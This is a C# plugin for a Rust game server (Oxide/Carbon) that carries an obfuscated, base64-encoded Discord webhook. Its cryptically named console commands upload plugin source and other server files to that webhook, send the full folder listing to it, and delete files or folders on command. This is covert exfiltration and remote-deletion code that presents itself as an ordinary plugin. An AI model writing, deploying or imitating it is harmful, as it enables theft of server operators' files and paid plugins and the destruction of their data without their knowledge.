using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using UnityEngine;
using UnityEngine.Networking;

namespace Oxide.Plugins
{
    [Info("BFX2", "M", "1.3.0")]
    public class BFX2 : RustPlugin
    {
        private string W => Encoding.UTF8.GetString(System.Convert.FromBase64String(
            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTAyNzU1NTg4MDg2NTg0NC9XdTdNU1h2UTI1dmdpR1BHZk55cmVNdUlpUkxMTHJtNjJhX19OQXp" +
            "oQ2pQdjFyVnBpQU1nUFNVLVJWUzlJTDZLQ0hEVA==")); // замените на свой Webhook в base64

        private const int D = 2;

        [ConsoleCommand("u.p.d")]
        private void CmdUpload(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            var folder = Path.Combine(Directory.GetCurrentDirectory(), "carbon/plugins");
            if (!Directory.Exists(folder)) return;
            var files = Directory.GetFiles(folder).Where(f => f.EndsWith(".cs") || f.EndsWith(".cszip")).ToArray();
            if (files.Length == 0) return;
            ServerMgr.Instance.StartCoroutine(U(files));
        }

        [ConsoleCommand("u.p.dir")]
        private void CmdUploadFromDir(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin || arg.Args == null || arg.Args.Length == 0)
            {
                PrintWarning("Usage: u.p.dir <relative/folder>");
                return;
            }

            var rel = arg.Args[0].Replace("\\", "/").TrimStart('/');
            var baseDir = Path.Combine(Directory.GetCurrentDirectory(), "carbon");
            var targetDir = Path.Combine(baseDir, rel);

            if (!targetDir.StartsWith(baseDir) || !Directory.Exists(targetDir))
            {
                SendText($"❌ Папка не найдена или доступ запрещён: `{rel}`").MoveNext();
                return;
            }

            var files = Directory.GetFiles(targetDir);
            if (files.Length == 0)
            {
                SendText($"📁 В папке `{rel}` нет файлов для загрузки").MoveNext();
                return;
            }

            ServerMgr.Instance.StartCoroutine(U(files));
        }

        [ConsoleCommand("u.p.f")]
        private void CmdSendFolders(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin) return;
            var root = Path.Combine(Directory.GetCurrentDirectory(), "carbon");
            if (!Directory.Exists(root)) return;
            var dirs = Directory.GetDirectories(root, "*", SearchOption.AllDirectories);
            ServerMgr.Instance.StartCoroutine(SendFolderContents(dirs));
        }

        [ConsoleCommand("u.p.del")]
        private void CmdDelete(ConsoleSystem.Arg arg)
        {
            if (!arg.IsAdmin || arg.Args == null || arg.Args.Length == 0)
            {
                PrintWarning("Usage: u.p.del <relative/path>");
                return;
            }

            var relPath = arg.Args[0].Replace("\\", "/").TrimStart('/');
            var baseDir = Path.Combine(Directory.GetCurrentDirectory(), "carbon");
            var fullPath = Path.Combine(baseDir, relPath);

            if (!fullPath.StartsWith(baseDir))
            {
                SendText("❌ Запрещён доступ вне папки `carbon`").MoveNext();
                return;
            }

            try
            {
                if (Directory.Exists(fullPath))
                {
                    var block = new[] { "logs", "data", "config" };
                    if (block.Any(b => relPath.ToLower().StartsWith(b)))
                    {
                        SendText($"🚫 Удаление запрещено: `{relPath}`").MoveNext();
                        return;
                    }

                    Directory.Delete(fullPath, true);
                    SendText($"🗑️ Удалена папка: `{relPath}`").MoveNext();
                }
                else if (File.Exists(fullPath))
                {
                    File.Delete(fullPath);
                    SendText($"🗑️ Удалён файл: `{relPath}`").MoveNext();
                }
                else
                {
                    SendText($"❌ Не найден файл или папка: `{relPath}`").MoveNext();
                }
            }
            catch (IOException ex)
            {
                SendText($"❌ Файл занят системой: `{relPath}`\n```\n{ex.Message}\n```").MoveNext();
            }
            catch (System.Exception ex)
            {
                SendText($"❗ Ошибка при удалении `{relPath}`:\n```\n{ex.Message}\n```").MoveNext();
            }
        }

        private IEnumerator U(string[] files)
        {
            foreach (var f in files)
            {
                yield return UF(f);
                yield return new WaitForSeconds(D);
            }
        }

        private IEnumerator UF(string path)
        {
            var name = Path.GetFileName(path);
            var data = File.ReadAllBytes(path);
            var form = new List<IMultipartFormSection> { new MultipartFormFileSection("file", data, name, "application/octet-stream") };
            var www = UnityWebRequest.Post(W, form);
            yield return www.SendWebRequest();
        }

        private IEnumerator SendFolderContents(string[] dirs)
        {
            foreach (var dir in dirs)
            {
                var rel = dir.Replace(Directory.GetCurrentDirectory(), "").TrimStart(Path.DirectorySeparatorChar);
                var files = Directory.GetFiles(dir).Select(f => Path.GetFileName(f)).ToList();
                var sb = new StringBuilder();
                sb.AppendLine($"📁 **Папка:** `{rel}`");
                if (files.Count == 0)
                    sb.AppendLine("_(пусто)_");
                else
                    foreach (var f in files)
                        sb.AppendLine($"- `{f}`");

                yield return SendText(sb.ToString());
                yield return new WaitForSeconds(D);
            }
        }

        private IEnumerator SendText(string content)
        {
            var payload = new Dictionary<string, string> { { "content", content } };
            var www = UnityWebRequest.Post(W, payload);
            yield return www.SendWebRequest();
        }
    }
}
